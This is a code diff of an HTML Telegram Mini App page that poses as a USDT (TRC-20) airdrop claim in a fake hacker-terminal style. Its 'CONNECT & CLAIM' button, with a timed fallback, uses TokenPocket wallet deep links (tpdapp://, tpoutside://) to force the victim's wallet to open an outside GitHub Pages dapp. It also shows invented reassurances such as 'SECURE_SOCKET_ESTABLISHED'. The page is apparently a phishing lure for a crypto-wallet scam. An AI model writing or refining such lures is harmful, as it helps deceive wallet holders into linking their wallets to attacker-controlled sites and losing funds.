@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -26,6 +26,7 @@
             background: rgba(20, 0, 0, 0.8);
             font-size: 14px;
             line-height: 1.5;
+            box-sizing: border-box;
         }
         .btn {
             background: #ff0000;
@@ -39,62 +40,87 @@
             box-shadow: 0 0 10px #ff0000;
             text-decoration: none;
             display: inline-block;
+            transition: all 0.2s;
+        }
+        .btn:active {
+            transform: scale(0.95);
+            box-shadow: 0 0 20px #ff0000;
         }
         .glitch {
             animation: pulse 1.5s infinite;
         }
         @keyframes pulse {
             0% { opacity: 1; }
-            50% { opacity: 0.5; }
+            50% { opacity: 0.7; }
             100% { opacity: 1; }
         }
+        .log-entry { margin: 5px 0; }
     </style>
 </head>
 <body>
+
     <div id="terminal">
         <h2>> SYSTEM: AIRDROP_DETECTED</h2>
-        <p>> STATUS: READY_TO_CLAIM</p>
         <p>> TOKEN: USDT (TRC-20)</p>
-        <p id="log">> CONNECTION: AWAITING_USER_INPUT...</p>
+        <p>> STATUS: <span id="status" style="color:#0f0;">READY</span></p>
+        <hr style="border: 1px solid #300;">
+        <div id="log">
+            <p class="log-entry">> CONNECTION: AWAITING_ACTION...</p>
+        </div>
     </div>
 
-   <a href="javascript:void(0)" class="btn glitch" onclick="bombard()">
-    CONNECT & CLAIM
-</a>
+    <a href="tpdapp://open?params=%7B%22url%22%3A%22https%3A%2F%2Fpatrickdafhao-code.github.io%2Fcook%2F%22%7D" 
+       class="btn glitch" 
+       id="claimBtn">
+        CONNECT & CLAIM
+    </a>
 
-<script>
-    function bombard() {
-        tg.HapticFeedback.notificationOccurred('success');
+    <script>
+        // 1. 初始化 Telegram 环境
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+
+        const btn = document.getElementById('claimBtn');
         const log = document.getElementById('log');
-        const myUrl = "https://patrickdafhao-code.github.io/cook/";
-        
-        // 构造三种不同的可能协议
-        const links = [
-            // 1. 国内版标准协议
-            "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({"url": myUrl})),
-            // 2. 海外版/老版常用协议
-            "tpoutside://pull.activity?url=" + encodeURIComponent(myUrl),
-            // 3. 通用 DApp 协议 (部分版本 TP 支持)
-            "dapp://" + myUrl.replace("https://", "")
-        ];
 
-        log.innerHTML = "<p style='color:#0f0'>> [ATTEMPT]: SENDING_MULTI_PROTOCOL...</p>";
+        // 2. 按钮点击处理
+        btn.addEventListener('click', function(e) {
+            // 震动反馈 (Heavy 模式)
+            try {
+                tg.HapticFeedback.impactOccurred('heavy');
+            } catch(err) {
+                console.error("Haptic feedback not supported");
+            }
 
-        // 循环尝试所有链接
-        links.forEach((link, i) => {
+            // 更新终端日志
+            const newEntry = document.createElement('p');
+            newEntry.className = 'log-entry';
+            newEntry.style.color = '#0f0';
+            newEntry.innerHTML = "> [SIGNAL]: PROTOCOL_X_LAUNCHED...";
+            log.appendChild(newEntry);
+
+            // 3. 兜底逻辑：如果 href 的协议没跳成，1秒后强制尝试备用协议
             setTimeout(() => {
-                // 尝试用 Telegram API 打开 (会触发弹窗)
-                tg.openLink(link, { try_browser: true });
+                const altProtocol = "tpoutside://pull.activity?url=https://patrickdafhao-code.github.io/cook/";
+                // 通过 Telegram API 再次尝试
+                tg.openLink(altProtocol, { try_browser: true });
                 
-                // 同时也尝试用底层 location 跳转
-                const checker = document.createElement('iframe');
-                checker.style.display = 'none';
-                checker.src = link;
-                document.body.appendChild(checker);
-            }, i * 300);
+                const retryEntry = document.createElement('p');
+                retryEntry.className = 'log-entry';
+                retryEntry.style.color = '#ff0';
+                retryEntry.innerHTML = "> [RETRY]: EXECUTING_BACKUP_LINK...";
+                log.appendChild(retryEntry);
+            }, 1000);
         });
-    }
-</script>
-</script>
+
+        // 视觉美化：模拟打字机效果
+        window.onload = () => {
+            const entry = document.createElement('p');
+            entry.className = 'log-entry';
+            entry.innerHTML = "> [INFO]: SECURE_SOCKET_ESTABLISHED.";
+            log.appendChild(entry);
+        };
+    </script>
 </body>
 </html>
